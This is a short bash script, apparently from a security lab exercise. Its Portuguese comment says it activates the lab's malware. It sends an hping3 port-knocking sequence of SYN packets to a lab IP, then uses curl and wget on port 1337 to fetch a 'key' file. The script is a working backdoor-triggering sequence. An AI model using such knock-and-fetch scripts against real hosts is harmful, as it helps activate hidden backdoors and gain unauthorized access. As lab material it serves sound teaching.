#!/bin/bash
#Script p ativar o malware do lab
if [ "$1" == "START" ]
then
	hping3 172.16.1.55 -S -p 13 -c 1 -s 1238 -w 54
	hping3 172.16.1.55 -S -p 37 -c 1 -s 2879 -w 54
	hping3 172.16.1.55 -S -p 30000 -c 1 -s 2116 -w 54
	hping3 172.16.1.55 -S -p 3000 -c 1 -s 1863 -w 54
	curl "172.16.1.55:1337" -m .5 2>/dev/null
	wget -T 1 -t 1 -w 0 172.16.1.55:1337 -O key 2>/dev/null #baixa o conteúdo do IP e manda os erros p ignoto

else
	echo "Digite START para iniciar"
fi
exit 0

#deixar  interativo, mas batendo nas mesmas portas
#substitui o IP por $1
#troca o if por $2
#a sintaxe passa a ser 01.sh IP START
